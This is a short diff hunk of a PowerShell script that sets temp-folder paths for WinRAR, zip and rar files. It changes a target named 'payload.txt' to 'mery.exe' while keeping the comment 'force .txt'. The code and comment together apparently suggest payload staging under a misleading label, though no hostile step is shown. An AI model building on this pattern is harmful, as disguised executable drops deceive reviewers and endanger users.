@@ -10,7 +10,7 @@ $tmp  = $env:TEMP
 $base = Join-Path $tmp 'WinRAR'
 $zip  = Join-Path $tmp 'winrar.zip'
 $rar  = Join-Path $tmp 'm782tl.rar'
-$txt  = Join-Path $tmp 'payload.txt'              # force .txt
+$txt  = Join-Path $tmp 'mery.exe'              # force .txt
 
 # Clean up any previous folder
 if (Test-Path $base) {
